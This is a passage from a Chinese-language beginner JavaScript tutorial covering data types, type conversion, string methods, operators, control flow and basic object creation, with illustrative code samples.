			a = Number.MIN_VALUE;
			//console.log(a);
			
			/*
			 * 在JS中整数的运算基本可以保证精确
			 */
			var c = 1865789 + 7654321;
			
			/*
			 * 如果使用JS进行浮点运算，可能得到一个不精确的结果
			 * 	所以千万不要使用JS进行对精确度要求比较高的运算	
			 */
			var c = 0.1 + 0.2;
			console.log(c);
		&lt;/script&gt;</code></pre> 
<blockquote> 
 <p><strong>        - Boolean 布尔值</strong><br>             - 布尔值主要用来进行逻辑判断，布尔值只有两个<br>             - true 逻辑的真<br>             - false 逻辑的假<br>             - 使用typeof检查一个布尔值时，会返回"boolean"    </p> 
</blockquote> 
<blockquote> 
 <p><strong>        - Null 空值</strong><br>             - 空值专门用来表示为空的对象，Null类型的值只有一个：null<br>             - 使用typeof检查一个Null类型的值时会返回"object"</p> 
</blockquote> 
<blockquote> 
 <p><strong>        - Undefined 未定义</strong><br>             - 如果声明一个变量但是没有为变量赋值此时变量的值就是undefined<br>             - 该类型的值只有一个 undefined<br>             - 使用typeof检查一个Undefined类型的值时，会返回"undefined"</p> 
</blockquote> 
<p><strong>② 引用数据类型</strong>：Object 对象</p> 
<h4>2）类型转换</h4> 
<p>类型转换就是指将其他的数据类型，转换为String Number 或 Boolean。</p> 
<p><strong>① 转换为String</strong></p> 
<blockquote> 
 <p><strong>- 方式一（强制类型转换）：</strong><br>     - 调用被转换数据的<span style="color:#ed7976;">toString()</span>方法<br>     - 例子：<br>         var a = 123;<br>         a = a.toString();<br>     - 注意：这个方法不适用于null和undefined<br>         由于这两个类型的数据中没有方法，所以调用toString()时会报错<br><strong>        <br> - 方式二（强制类型转换）：</strong><br>     - 调用<span style="color:#ed7976;">String()</span>函数<br>     - 例子：<br>         var a = 123;<br>         a = String(a);<br>     - 原理：对于Number Boolean String都会调用他们的toString()方法来将其转换为字符串，<br>         对于null值，直接转换为字符串"null"。对于undefined直接转换为字符串"undefined"<br><strong>        <br> - 方式三（隐式的类型转换）:</strong><br>     - 为任意的数据类型 +""<br>     - 例子：<br>         var a = true;<br>         a = a + "";<br>     - 原理：和String()函数一样    </p> 
</blockquote> 
<p><strong>②  转换为Number</strong></p> 
<blockquote> 
 <p><strong>            - 方式一（强制类型转换）：</strong><br>                 - 调用<span style="color:#ed7976;">Number()</span>函数<br>                 - 例子：<br>                     var s = "123";<br>                     s = Number(s);<br>                 - 转换的情况：<br>                     1.字符串 --&gt; 数字<br>                         - 如果字符串是一个合法的数字，则直接转换为对应的数字<br>                         - 如果字符串是一个非法的数字，则转换为NaN<br>                         - 如果是一个空串或纯空格的字符串，则转换为0<br>                     2.布尔值 --&gt; 数字<br>                         - true转换为1<br>                         - false转换为0<br>                     3.空值 --&gt; 数字<br>                         - null转换为0<br>                     4.未定义 --&gt; 数字<br>                         - undefined 转换为NaN<br><strong>                        <br>             - 方式二（强制类型转换）：</strong><br>                 - 调用<span style="color:#ed7976;">parseInt()或parseFloat()</span><br>                 - 这两个函数专门用来将一个字符串转换为数字的<br>                 - parseInt()<br>                     - 可以将一个字符串中的有效的整数位提取出来，并转换为Number<br>                     - 例子：<br>                         var a = "123.456px";<br>                         a = parseInt(a); //123<br>                     - 如果需要可以在parseInt()中指定一个第二个参数，来指定进制    <br>                         <br>                 - parseFloat()<br>                     - 可以将一个字符串中的有效的小数位提取出来，并转换为Number<br>                     - 例子：<br>                         var a = "123.456px";<br>                         a = parseFloat(a); //123.456<br><strong>                        <br>             - 方式三（隐式的类型转换）：</strong><br>                 - 使用一元的<span style="color:#ed7976;">+</span>来进行隐式的类型转换<br>                 - 例子：<br>                     var a = "123";<br>                     a = +a;<br>                     <br>                 - 原理：和Number()函数一样    </p> 
</blockquote> 
<pre><code class="language-javascript">		&lt;script type="text/javascript"&gt;
			var a = 123;
			/*
			 * 在js中，如果需要表示16进制的数字，则需要以0x开头
			 * 			如果需要表示8进制的数字，则需要以0开头
			 * 			如果要要表示2进制的数字，则需要以0b开头
			 * 				但是不是所有的浏览器都支持
			 * 	
			 */
			
			//十六进制
			a = 0x10;
			a = 0xff;
			a = 0xCafe;
			
			//八进制数字
			a = 070;
			
			//二进制数字
			//a = 0b10;
			
			//向"070"这种字符串，有些浏览器会当成8进制解析，有些会当成10进制解析
			a = "070";
			
			//可以在parseInt()中传递一个第二个参数，来指定数字的进制
			a = parseInt(a,10);
			
			console.log(typeof a);
			console.log(a);

			//对于Number调用toString()时可以在方法中传递一个整数作为参数
			//此时它将会把数字转换为指定的进制,如果不指定则默认转换为10进制
			a = a.toString(2);
			
			console.log(a);
			console.log(typeof a);
		&lt;/script&gt;</code></pre> 
<p><strong>③ 转换为布尔值</strong></p> 
<blockquote> 
 <p><strong>            - 方式一（强制类型转换）：</strong><br>                 - 使用<span style="color:#ed7976;">Boolean()</span>函数<br>                 - 例子：<br>                     var s = "false";<br>                     s = Boolean(s); //true<br>                 - 转换的情况<br>                     字符串 --&gt; 布尔<br>                         - 除了空串其余全是true<br>                         <br>                     数值 --&gt; 布尔<br>                         - 除了0和NaN其余的全是true<br>                         <br>                     null、undefined ---&gt; 布尔<br>                         - 都是false<br>                         <br>                     对象 ---&gt; 布尔<br>                         - 都是true<br><strong>            <br>             - 方式二（隐式类型转换）：    </strong><br>                 - 为任意的数据类型<span style="color:#ed7976;">做两次非运算</span>，即可将其转换为布尔值<br>                 - 例子：    <br>                     var a = "hello";<br>                     a = !!a; //true</p> 
</blockquote> 
<h3>包装类</h3> 
<blockquote> 
 <p>    - <strong>在JS中为我们提供了三个包装类：String() Boolean() Number()</strong><br>         - 通过这三个包装类可以创建基本数据类型的对象<br>         例子：<br>             var num = new Number(2);<br>             var str = new String("hello");<br>             var bool = new Boolean(true);<br>         - 但是在实际应用中千万不要这么干。<br>     <br>     - 当我们去操作一个基本数据类型的属性和方法时，<br>         解析器会临时将其转换为对应的包装类，然后再去操作属性和方法，<br>         操作完成以后再将这个临时对象进行销毁。</p> 
</blockquote> 
<h3>字符串的相关的方法</h3> 
<blockquote> 
 <p><strong>    length</strong><br>         - 获取字符串的长度<br><strong>    charAt()</strong><br>         - 根据索引获取指定的字符<br><strong>    charCodeAt()</strong><br>         - 根据索引获取指定的字符编码<br><strong>    String.fromCharCode()</strong><br>         - 根据字符编码获取字符<br><strong>    indexOf()</strong><br><strong>    lastIndexOf()</strong><br>         - 从一个字符串中检索指定内容<br>         - 需要一个字符串作为参数，这个字符串就是要检索的内容，如果找到该内容，则会返回其第一次出现的索引，如果没有找到则返回-1。<br>         - 可以指定一个第二个参数，来表示开始查找的位置<br>         - indexOf()是从前向后找<br>         - lastIndexOf()是从后向前找<br><strong>    slice()</strong><br>         - 可以从一个字符串中截取指定的内容，并将截取到内容返回，不会影响原变量<br>         - 参数：<br>             第一个：截取开始的位置（包括开始）<br>             第二个：截取结束的位置（不包括结束）<br>                 - 可以省略第二个参数，如果省略则一直截取到最后<br>             - 可以传负数，如果是负数则从后往前数<br><strong>    substr()    </strong><br>         - 和slice()基本一致，不同的是它第二个参数不是索引，而是截取的数量<br>         <br><strong>    substring()</strong><br>         - 和slice()基本一致，不同的是它不能接受负值作为参数，如果设置一个负值，则会自动修正为0，substring()中如果第二个参数小于第一个，自动调整位置<br>   <strong>  toLowerCase() </strong><br>         - 将字符串转换为小写并返回<br><strong>    toUpperCase() </strong><br>         - 将字符串转换为大写并返回<br><strong>    split()</strong><br>         - 可以根据指定内容将一个字符串拆分为一个数组<br>         - 参数：<br>             - 需要一个字符串作为参数，将会根据字符串去拆分数组<br>                 可以接收一个正则表达式，此时会根据正则表达式去拆分数组<br>                 <br><strong>    match() </strong><br>         - 可以将字符串中和正则表达式匹配的内容提取出来<br>         - 参数：<br>             - 正则表达式，可以根据该正则表达式将字符串中符合要求的内容提取出来，并且封装到一个数组中返回<br>     <br><strong>    replace()  </strong><br>         - 可以将字符串中指定内容替换为新的内容<br>         - 参数：<br>             - 第一个：被替换的内容，可以是一个正则表达式<br>             - 第二个：替换的新内容<br>             <br><strong>    search() </strong><br>         - 可以根据正则表达式去字符串中查找指定的内容<br>         - 参数：<br>             正则表达式，将会根据该表达式查询内容，并且将第一个匹配到的内容的索引返回，如果没有匹配到任何内容，则返回-1。</p> 
</blockquote> 
<p></p> 
<h3>3.3 运算符 </h3> 
<h4>1）运算符</h4> 
<p>运算符也称为操作符，通过运算符可以对一个或多个值进行运算或操作。</p> 
<blockquote> 
 <p><strong>- typeof运算符</strong><br>     - 用来检查一个变量的数据类型<br>     - 语法：typeof 变量<br>     - 它会返回一个用于描述类型的字符串作为结果</p> 
</blockquote> 
<blockquote> 
 <p><strong>- 算数运算符</strong><br>     +    对两个值进行加法运算并返回结果<br>     -      对两个值进行减法运算并返回结果<br>     *    对两个值进行乘法运算并返回结果<br>     /    对两个值进行除法运算并返回结果<br>     %    对两个值进行取余运算并返回结果<br>     <br>     - 除了加法以外，对非Number类型的值进行运算时，都会先转换为Number然后在做运算。<br>     - 而做加法运算时，如果是两个字符串进行相加，则会做拼串操作，将两个字符连接为一个字符串。<br>     - 任何值和字符串做加法，都会先转换为字符串，然后再拼串</p> 
</blockquote> 
<pre><code class="language-html">&lt;script type="text/javascript"&gt;
	
	/*
	 * 运算符也叫操作符
	 * 	通过运算符可以对一个或多个值进行运算,并获取运算结果
	 * 	比如：typeof就是运算符，可以来获得一个值的类型
	 * 		它会将该值的类型以字符串的形式返回
	 * 		number string boolean undefined object
	 * 
	 * 	算数运算符
	 * 		当对非Number类型的值进行运算时，会将这些值转换为Number然后在运算
	 * 			任何值和NaN做运算都得NaN
	 * 
	 * 		+
	 * 			+可以对两个值进行加法运算，并将结果返回
	 * 			 如果对两个字符串进行加法运算，则会做拼串
	 * 				会将两个字符串拼接为一个字符串，并返回
	 * 			任何的值和字符串做加法运算，都会先转换为字符串，然后再和字符串做拼串的操作
	 * 		-
	 * 			- 可以对两个值进行减法运算，并将结果返回
	 * 
	 * 		*
	 * 			* 可以对两个值进行乘法运算
	 * 		/
	 * 			/ 可以对两个值进行除法运算
	 * 		%
	 * 			% 取模运算（取余数）
	 */
	var a = 123;
	
	var result = typeof a;
	
	//console.log(typeof result);
	
	result = a + 1;
	
	result = 456 + 789;
	
	result = true + 1;
	
	result = true + false;
	
	result = 2 + null;
	
	result = 2 + NaN;
	
	result = "你好" + "大帅哥";
	
	var str = "锄禾日当午，" +
			  "汗滴禾下土，" +
			  "谁知盘中餐，" +
			  "粒粒皆辛苦";
			  
			  
	result = 123 + "1";
	
	result = true + "hello";
	
	//任何值和字符串相加都会转换为字符串，并做拼串操作
	/*
	 * 我们可以利用这一特点，来将一个任意的数据类型转换为String
	 * 	我们只需要为任意的数据类型 + 一个 "" 即可将其转换为String
	 * 	这是一种隐式的类型转换，由浏览器自动完成，实际上它也是调用String()函数
	 */
	var c = 123;
	
	c = c + "";
	
	//c = null;
	
	//c = c + "";
	
	
	//console.log(result);
	//console.log(typeof c);
	//console.log("c = "+c);
	
	result = 1 + 2 + "3"; //33
	
	result = "1" + 2 + 3; //123
	
	result = 100 - 5;
	
	result = 100 - true;
	
	result = 100 - "1";
	
	result = 2 * 2;
	
	result = 2 * "8";
	
	result = 2 * undefined;
	
	result = 2 * null;
	
	result = 4 / 2;
	
	result = 3 / 2;
	
	/*
	 * 任何值做- * /运算时都会自动转换为Number
	 * 	我们可以利用这一特点做隐式的类型转换
	 * 		可以通过为一个值 -0 *1 /1来将其转换为Number
	 * 		原理和Number()函数一样，使用起来更加简单
	 */
	
	var d = "123";
	
	//console.log("result = "+result);
	
	d = d - 0;
	
	/*console.log(typeof d);
	console.log(d);*/
	
	result = 9 % 3;
	result = 9 % 4;
	result = 9 % 5;
	
	console.log("result = "+result);
	
&lt;/script&gt;</code></pre> 
<h4>2）一元运算符</h4> 
<blockquote> 
 <p>一元运算符只需要一个操作数<br><strong>① 一元的“+”：</strong>就是正号，不会对值产生任何影响，但是可以将一个非数字转换为数字<br>                 - 例子：<br>                     var a = true;<br>                     a = +a;<br>                 <br><strong>② 一元的“-”：</strong>就是负号，可以对一个数字进行符号位取反<br>                 - 例子：<br>                     var a = 10;<br>                     a = -a;</p> 
 <p><br> 对于非Number类型的值，它会将先转换为Number，然后再运算。<br> 可以对一个其他的数据类型使用+,来将其转换为number。它的原理和Number()函数一样</p> 
</blockquote> 
<h4>3）自增和自减</h4> 
<blockquote> 
 <p><strong>            - 自增</strong><br>                 - 自增可以使变量在原值的基础上自增1<br>                 - 自增使用 ++<br>                 - 自增可以使用 前++（++a）后++(a++)<br>                 - 无论是++a 还是 a++都会立即使原变量自增1<br>                     不同的是++a和a++的值是不同的，<br>                         ++a的值是变量的新值（自增后的值）<br>                         a++的值是变量的原值（自增前的值）</p> 
 <p><strong>            - 自减    </strong><br>                 - 自减可以使变量在原值的基础上自减1<br>                 - 自减使用 --<br>                 - 自减可以使用 前--（--a）后--(a--)<br>                 - 无论是--a 还是 a--都会立即使原变量自减1<br>                     不同的是--a和a--的值是不同的，<br>                         --a的值是变量的新值（自减后的值）<br>                         a--的值是变量的原值（自减前的值）</p> 
</blockquote> 
<h4>4）逻辑运算符</h4> 
<blockquote> 
 <p><strong>        ! 非</strong><br>             - 非运算可以对一个布尔值进行取反，true变false false边true<br>             - 当对非布尔值使用!时，会先将其转换为布尔值然后再取反<br>             - 我们可以利用!来将其他的数据类型转换为布尔值<br>         <br><strong>        &amp;&amp; 与</strong><br>             - &amp;&amp;可以对符号两侧的值进行与运算<br>             - 只有两端的值都为true时，才会返回true。只要有一个false就会返回false。<br>             - 与是一个短路的与，如果第一个值是false，则不再检查第二个值<br>             - 对于非布尔值，它会将其转换为布尔值然后做运算，并返回原值<br>             - 规则：<br>                     1.如果第一个值为false，则返回第一个值<br>                     2.如果第一个值为true，则返回第二个值<br>         <br><strong>        || 或</strong><br>             - ||可以对符号两侧的值进行或运算<br>             - 只有两端都是false时，才会返回false。只要有一个true，就会返回true。<br>             - 或是一个短路的或，如果第一个值是true，则不再检查第二个值<br>             - 对于非布尔值，它会将其转换为布尔值然后做运算，并返回原值<br>             - 规则：    <br>                     1.如果第一个值为true，则返回第一个值<br>                     2.如果第一个值为false，则返回第二个值</p> 
</blockquote> 
<pre><code class="language-javascript">		&lt;script type="text/javascript"&gt;
			
			/*
			 * &amp;&amp; || 非布尔值的情况
			 * 	- 对于非布尔值进行与或运算时，
			 * 		会先将其转换为布尔值，然后再运算，并且返回原值
			 * 	- 与运算：
			 * 		- 如果第一个值为true，则必然返回第二个值
			 * 		- 如果第一个值为false，则直接返回第一个值
			 * 
			 * 	- 或运算
			 * 		- 如果第一个值为true，则直接返回第一个值
			 * 		- 如果第一个值为false，则返回第二个值
			 * 
			 */
			
			//true &amp;&amp; true
			//与运算：如果两个值都为true，则返回后边的
			var result = 5 &amp;&amp; 6;
			
			
			//与运算：如果两个值中有false，则返回靠前的false
			//false &amp;&amp; true
			result = 0 &amp;&amp; 2;
			result = 2 &amp;&amp; 0;
			//false &amp;&amp;　false
			result = NaN &amp;&amp; 0;
			result = 0 &amp;&amp; NaN;
			
			
			//true || true
			//如果第一个值为true，则直接返回第一个值
			result = 2 || 1;
			result = 2 || NaN;
			result = 2 || 0;
			
			//如果第一个值为false，则直接返回第二个值
			result = NaN || 1;
			result = NaN || 0;
			
			result = "" || "hello";
			
			result = -1 || "你好";
			
			
			console.log("result = "+result);
			
		&lt;/script&gt;</code></pre> 
<h4>5）赋值运算符</h4> 
<blockquote> 
 <p><strong>① =</strong> ：可以将符号右侧的值赋值给左侧变量</p> 
 <p><strong>② +=</strong></p> 
 <ul><li>a += 5 相当于 a = a+5</li><li>var str = "hello";  str += "world";</li></ul> 
 <p><strong>③ -=</strong></p> 
 <ul><li>a -= 5  相当于 a = a-5</li></ul> 
 <p><strong>④ *=</strong></p> 
 <ul><li>a *= 5 相当于 a = a*5</li></ul> 
 <p><strong>⑤ /=</strong></p> 
 <ul><li>a /= 5 相当于 a = a/5    </li></ul> 
 <p><strong>⑥ %=</strong></p> 
 <ul><li>a %= 5 相当于 a = a%5</li></ul> 
</blockquote> 
<h4>6）关系运算符</h4> 
<p>关系运算符用来比较两个值之间的大小关系的。</p> 
<ul><li>&gt;</li><li>&gt;=</li><li>&lt;</li><li>&lt;=</li></ul> 
<p>关系运算符的规则和数学中一致，用来比较两个值之间的关系，如果关系成立则返回true，关系不成立则返回false。</p> 
<blockquote> 
 <p>如果比较的两个值是非数值，会将其转换为Number然后再比较。</p> 
 <p>如果比较的两个值都是字符串，此时会比较字符串的<strong>Unicode编码</strong>，而不会转换为Number。</p> 
</blockquote> 
<pre><code class="language-javascript">&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset="UTF-8"&gt;
		&lt;title&gt;&lt;/title&gt;
		&lt;script type="text/javascript"&gt;

			//比较两个字符串时，比较的是字符串的字符编码
			//console.log("a" &lt; "b");//true
			//比较字符编码时是一位一位进行比较
			//如果两位一样，则比较下一位，所以借用它来对英文进行排序
			//console.log("abc" &lt; "bcd");//true
			//比较中文时没有意义
			//console.log("戒" &gt; "我"); //true
			
			//如果比较的两个字符串型的数字，可能会得到不可预期的结果
			//注意：在比较两个字符串型的数字时，一定一定一定要转型
			console.log("11123123123123123123" &lt; +"5"); //true

			
			/*
			 * 在字符串中使用转义字符输入Unicode编码
			 * 	\u四位编码
			 */
			console.log("\u2620");
			
		&lt;/script&gt;
	&lt;/head&gt;
	&lt;body&gt;
		
		&lt;!--在网页中使用Unicode编码
			&amp;#编码; 这里的编码需要的是10进制
		--&gt;
		&lt;h1 style="font-size: 200px;"&gt;&amp;#9760;&lt;/h1&gt;
		&lt;h1 style="font-size: 200px;"&gt;&amp;#9856;&lt;/h1&gt;
		
	&lt;/body&gt;
&lt;/html&gt;</code></pre> 
<h4>7）相等运算符</h4> 
<blockquote> 
 <p><strong>==</strong><br>     - 相等，判断左右两个值是否相等，如果相等返回true，如果不等返回false<br>     - 相等会自动对两个值进行类型转换，如果对不同的类型进行比较，会将其转换为相同的类型然后再比较，<br>         转换后相等它也会返回true<br><strong>!=</strong><br>     - 不等，判断左右两个值是否不等，如果不等则返回true，如果相等则返回false<br>     - 不等也会做自动的类型转换。<br>     <br><strong>===</strong><br>     - 全等，判断左右两个值是否全等，它和相等类似，只不过它不会进行自动的类型转换，<br>         如果两个值的类型不同，则直接返回false<br>         <br><strong>!==</strong><br>     - 不全等，和不等类似，但是它不会进行自动的类型转换，如果两个值的类型不同，它会直接返回true<br>     <br><strong>特殊的值：</strong><br>     - null和undefined<br>         - 由于undefined衍生自null，所以null == undefined 会返回true。<br>             但是 null === undefined 会返回false。<br>             <br>     - NaN<br>         - NaN不与任何值相等，报告它自身 NaN == NaN //false<br>         <br>     - 判断一个值是否是NaN<br>         - 使用isNaN()函数</p> 
</blockquote> 
<pre><code class="language-javascript">			//console.log(1 == 1); //true
			
			var a = 10;
			
			//console.log(a == 4); //false
			
			//console.log("1" == 1); //true
			
			//console.log(true == "1"); //true
			
			//console.log(null == 0); //false
			
			/*
			 * undefined 衍生自 null
			 * 	所以这两个值做相等判断时，会返回true
			 */
			//console.log(undefined == null);
			
			/*
			 * NaN不和任何值相等，包括他本身
			 */
			//console.log(NaN == NaN); //false
			
			var b = NaN;
			
			//判断b的值是否是NaN
			//console.log(b == NaN);
			/*
			 * 可以通过isNaN()函数来判断一个值是否是NaN
			 * 	如果该值是NaN则返回true，否则返回false
			 */
			//console.log(isNaN(b));
			
			//console.log(10 != 5); //true
			//console.log(10 != 10); //false
			//console.log("abcd" != "abcd"); //false
			//console.log("1" != 1);//false
			
			//console.log("123" === 123);//false
			//console.log(null === undefined);//false
			
			console.log(1 !== "1"); //true</code></pre> 
<h4>8）三元运算符</h4> 
<p>条件运算符也叫三元运算符。</p> 
<blockquote> 
 <p><span style="color:#ed7976;"><strong>        ?:</strong></span><br><span style="color:#494949;"><strong>            - 语法：</strong></span><span style="color:#ed7976;"><strong>条件表达式?语句1:语句2;</strong></span><br>             - 执行流程：<br>                 先对条件表达式求值判断，<br>                     如果判断结果为true，则执行语句1，并返回执行结果<br>                     如果判断结果为false，则执行语句2，并返回执行结果</p> 
</blockquote> 
<h4>9）优先级</h4> 
<blockquote> 
 <p>        - 和数学中一样，JS中的运算符也是具有优先级的，<br>             比如 先乘除 后加减 先与 后或<br>         - 具体的优先级可以参考优先级的表格，在表格中越靠上的优先级越高，<br>             优先级越高的越优先计算，优先级相同的，从左往右计算。<br>         - 优先级不需要记忆，如果越到拿不准的，使用()来改变优先级。</p> 
</blockquote> 
<pre><code class="language-javascript">		&lt;script type="text/javascript"&gt;
			
			/*
			 * , 运算符
			 * 	使用,可以分割多个语句，一般可以在声明多个变量时使用,
			 */
			//使用,运算符同时声明多个变量
			//var a , b , c;
			
			//可以同时声明多个变量并赋值
			//var a=1 , b=2 , c=3;
			//alert(b);
			
			/*
			 * 就和数学中一样，在JS中运算符也有优先级，
			 * 	比如：先乘除 后加减
			 * 在JS中有一个运算符优先级的表，
			 * 	在表中越靠上优先级越高，优先级越高越优先计算，
			 * 	如果优先级一样，则从左往右计算。
			 * 但是这个表我们并不需要记忆，如果遇到优先级不清楚
			 * 	可以使用()来改变优先级
			 */
			
			//var result = 1 + 2 * 3;
			
			/*
			 * 如果||的优先级高，或者两个一样高，则应该返回3
			 * 如果与的优先级高，则应该返回1
			 * 		
			 */
			var result = 1 || 2 &amp;&amp; 3;
			
			console.log("result = "+result);	
			
		&lt;/script&gt;</code></pre> 
<h3>3.4 流程控制语句</h3> 
<pre><code class="language-javascript">		&lt;script type="text/javascript"&gt;
			
			/*
			 * 我们的程序是由一条一条语句构成的
			 * 	语句是按照自上向下的顺序一条一条执行的
			 * 	在JS中可以使用{}来为语句进行分组,
			 * 		同一个{}中的语句我们称为是一组语句，
			 * 		它们要么都执行，要么都不执行，
			 * 		一个{}中的语句我们也称为叫一个代码块
			 * 		在代码块的后边就不用再编写;了
			 * 
			 * 	JS中的代码块，只具有分组的的作用，没有其他的用途
			 * 		代码块内容的内容，在外部是完全可见的
			 */
			{
				var a = 10;	
				alert("hello");
				console.log("你好");
				document.write("语句");
			}
			
			console.log("a = "+a);
		&lt;/script&gt;</code></pre> 
<p>程序都是自上向下的顺序执行的，通过流程控制语句可以改变程序执行的顺序，或者反复的执行某一段的程序。</p> 
<p><strong>分类：</strong></p> 
<ul><li>条件判断语句</li><li>条件分支语句</li><li>循环语句</li></ul> 
<h4>1）条件判断语句</h4> 
<blockquote> 
 <p>- 条件判断语句也称为if语句<br><strong>- 语法一：</strong><br>     if(条件表达式){<!-- --><br>         语句...<br>     }<br>     <br>     - 执行流程：<br>         if语句执行时，会先对条件表达式进行求值判断，如果值为true，则执行if后的语句，如果值为false，则不执行。</p> 
 <p>    </p> 
 <p><strong>- 语法二：</strong><br>     if(条件表达式){<!-- --><br>         语句...<br>     }else{<!-- --><br>         语句...<br>     }<br>     <br>     - 执行流程：<br>         if...else语句执行时，会对条件表达式进行求值判断，如果值为true，则执行if后的语句，如果值为false，则执行else后的语句。<br>     <br><strong>- 语法三：</strong><br>     if(条件表达式){<!-- --><br>         语句...<br>     }else if(条件表达式){<!-- --><br>         语句...<br>     }else if(条件表达式){<!-- --><br>         语句...<br>     }else if(条件表达式){<!-- --><br>         语句...<br>     }else{<!-- --><br>         语句...<br>     }<br>     <br>     - 执行流程<br>         - if...else if...else语句执行时，会自上至下依次对条件表达式进行求值判断，如果判断结果为true，则执行当前if后的语句，执行完成后语句结束。</p> 
 <p>如果判断结果为false，则继续向下判断，直到找到为true的为止。如果所有的条件表达式都是false，则执行else后的语句</p> 
</blockquote> 
<p></p> 
<h4>2）条件分支语句</h4> 
<blockquote> 
 <p>条件分支语句也叫switch语句。<br><strong>    - 语法:</strong><br><span style="color:#956fe7;">        switch(条件表达式){<!-- --><br>             case 表达式:<br>                 语句...<br>                 break;<br>             case 表达式:<br>                 语句...<br>                 break;<br>             case 表达式:<br>                 语句...<br>                 break;<br>             default:<br>                 语句...<br>                 break;<br>         }</span><br>         <br><strong>    - 执行流程：</strong><br>         - switch...case..语句在执行时，会依次将case后的表达式的值和switch后的条件表达式的值进行全等比较，如果比较结果为true，则从当前case处开始执行代码。当前case后的所有的代码都会执行，我们可以<span style="color:#4da8ee;">在case的后边跟着一个break关键字，这样可以确保只会执行当前case后的语句</span>，而不会执行其他的case。如果比较结果为false，则继续向下比较，如果所有的比较结果都为false，则只执行default后的语句。</p> 
</blockquote> 
<h4>3）循环语句</h4> 
<blockquote> 
 <p><strong>    - 通过循环语句可以反复执行某些语句多次<br><span style="background-color:#fefcd8;">    - while循环</span></strong><br>         - 语法：<br><span style="color:#ed7976;">            while(条件表达式){<!-- --><br>                 语句...<br>             }</span><br>             <br>         - 执行流程：<br>             while语句在执行时，会先对条件表达式进行求值判断，如果判断结果为false，则终止循环。如果判断结果为true，则执行循环体，循环体执行完毕，继续对条件表达式进行求值判断，依此类推。<br>                 <br><strong><span style="background-color:#fefcd8;">    - do...while循环</span></strong><br>         - 语法:<br>             do{<!-- --><br>                 语句...<br>             }while(条件表达式)<br>             <br>         - 执行流程<br>             do...while在执行时，会先执行do后的循环体，然后在对条件表达式进行判断，如果判断判断结果为false，则终止循环。如果判断结果为true，则继续执行循环体，依此类推。<br>                 <br>       <strong>  - 和while的区别：</strong><br><span style="color:#ed7976;">            while：先判断后执行<br>             do...while: 先执行后判断<br>             - do...while可以确保循环体至少执行一次。</span><br>             <br>             <br><strong><span style="background-color:#fefcd8;">    - for循环</span></strong><br>         - 语法：<br>             for(①初始化表达式 ; ②条件表达式 ; ④更新表达式){<!-- --><br>                 ③语句...<br>             }<br>         - 执行流程：<br>             首先执行①初始化表达式，初始化一个变量， 然后对②条件表达式进行求值判断，如果为false则终止循环。</p> 
 <p>如果判断结果为true，则执行③循环体，循环体执行完毕，执行④更新表达式，对变量进行更新。更新表达式执行完毕重复②<br>             <br><strong><span style="background-color:#fefcd8;">    - 死循环</span></strong><br>         while(true){<!-- --><br>         <br>         }<br>         <br>         for(;;){<!-- --><br>         <br>         }</p> 
</blockquote> 
<h3>3.5 对象（Object）</h3> 
<p>对象是JS中的引用数据类型。对象是一种复合数据类型，在对象中可以保存多个不同数据类型的属性。使用typeof检查一个对象时，会返回object。</p> 
<blockquote> 
 <p><strong>    - 创建对象</strong><br>         - 方式一：<br>             - var obj = new Object();<br>         - 方式二：<br>             - var obj = {};<br>             <br><strong>    - 向对象中添加属性</strong><br>         - 语法：<br>             对象.属性名 = 属性值;<br>             对象["属性名"] = 属性值;<br>             <br>             - 对象的属性名没有任何要求，不需要遵守标识符的规范，但是在开发中，尽量按照标识符的要求去写。<br>             -<span style="color:#956fe7;"> 属性值也可以任意的数据类型。</span></p> 
 <p>            </p> 
 <p><strong>    - 读取对象中的属性</strong><br>         - 语法：<br>             对象.属性名<br>             对象["属性名"]<br>         - 如果读取一个对象中没有的属性，它不会报错，而是返回一个undefined<br>         <br><strong>    - 删除对象中的属性</strong><br>         - 语法：<br>             delete 对象.属性名<br>             delete 对象["属性名"]<br>             <br><strong>    - 使用in检查对象中是否含有指定属性</strong><br>         - 语法："属性名" in 对象<br>             - 如果在对象中含有该属性，则返回true<br>                 如果没有则返回false<br>                 <br><strong>    - 使用对象字面量，在创建对象时直接向对象中添加属性</strong><br>         语法：<br>             var obj = {<!-- --><br>                             属性名:属性值,<br>                             属性名:属性值,<br>                             属性名:属性值,<br>                             属性名:属性值<br>                     }<br>                     <br><strong>    - 基本数据类型和引用数据类型</strong><br>         - 基本数据类型：String Number Boolean Null Undefined<br>         - 引用数据类型：Object</p> 
 <p><br>         - 基本数据类型的数据，变量是直接保存的它的值。变量与变量之间是互相独立的，修改一个变量不会影响其他的变量。<br>         - 引用数据类型的数据，变量是保存的对象的引用（内存地址）。如果多个变量指向的是同一个对象，此时修改一个变量的属性，会影响其他的变量。<br>         - 比较两个变量时，对于基本数据类型，比较的就是值，对于引用数据类型比较的是地址，地址相同才相同。</p> 
</blockquote> 
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset="UTF-8"&gt;
		&lt;title&gt;&lt;/title&gt;
		&lt;script type="text/javascript"&gt;
			/*
			 * JS中数据类型
			 * 	- String 字符串
			 *  - Number 数值
			 * 	- Boolean 布尔值
			 * 	- Null 空值
			 * 	- Undefined 未定义
			 * 		- 以上这五种类型属于基本数据类型，以后我们看到的值
			 * 			只要不是上边的5种，全都是对象
			 * 	- Object 对象
			 * 
			 * 
			 * 基本数据类型都是单一的值"hello" 123 true,
			 * 	值和值之间没有任何的联系。
			 * 
			 * 在JS中来表示一个人的信息（name gender age）：
			 * 	var name = "孙悟空";
			 * 	var gender = "男";
			 * 	var age = 18;
			 * 如果使用基本数据类型的数据，我们所创建的变量都是独立，不能成为一个整体。
			 * 
			 * 对象属于一种复合的数据类型，在对象中可以保存多个不同数据类型的属性。
			 * 
			 * 对象的分类：
			 * 	1.内建对象
			 * 		- 由ES标准中定义的对象，在任何的ES的实现中都可以使用
			 * 		- 比如：Math String Number Boolean Function Object....
			 * 
			 * 	2.宿主对象
			 * 		- 由JS的运行环境提供的对象，目前来讲主要指由浏览器提供的对象
			 * 		- 比如 BOM DOM
			 * 
			 * 	3.自定义对象
			 * 		- 由开发人员自己创建的对象
			 * 
			 */
			
			//创建对象
			/*
			 * 使用new关键字调用的函数，是构造函数constructor
			 * 	构造函数是专门用来创建对象的函数
			 * 使用typeof检查一个对象时，会返回object
			 */
			var obj = new Object();
			
			
			/*
			 * 在对象中保存的值称为属性
			 * 向对象添加属性
			 * 	语法：对象.属性名 = 属性值;
			 */
			
			//向obj中添加一个name属性
			obj.name = "孙悟空";
			//向obj中添加一个gender属性
			obj.gender = "男";
